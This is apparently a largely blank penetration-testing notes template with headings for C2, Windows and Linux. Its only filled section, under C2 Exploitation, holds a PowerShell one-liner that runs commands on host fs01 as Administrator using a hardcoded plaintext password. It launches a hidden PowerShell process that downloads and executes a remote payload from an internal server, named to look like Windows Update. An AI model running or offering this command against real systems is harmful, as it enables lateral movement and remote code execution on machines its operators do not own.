# C2
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```powershell
powershell $pspassword=ConvertTo-SecureString "sup3rs3cr3tP@ssw0rd!!" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential("FS01\Administrator",$pspassword);Invoke-Command -ComputerName fs01 -Credential $cred -ScriptBlock {powershell.exe -nop -w hidden -c "IEX(irm -useb 'http://10.130.4.100:8888/WindowsUpdate')"}
```

---
# Windows
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```

----
# Linux
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```
